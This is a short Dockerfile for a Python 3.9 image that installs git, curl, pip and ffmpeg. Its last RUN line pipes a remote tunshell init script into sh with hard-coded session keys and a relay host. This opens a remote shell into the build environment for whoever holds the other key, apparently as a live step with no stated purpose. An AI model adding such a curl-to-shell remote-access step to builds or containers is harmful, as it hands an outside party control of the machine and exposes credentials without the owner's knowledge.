FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl python3-pip ffmpeg -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T S3QyC4grUmWdwSbRX8oqc0 QJkdQgpMj4Xhcc6cnriMX6 eu.relay.tunshell.com
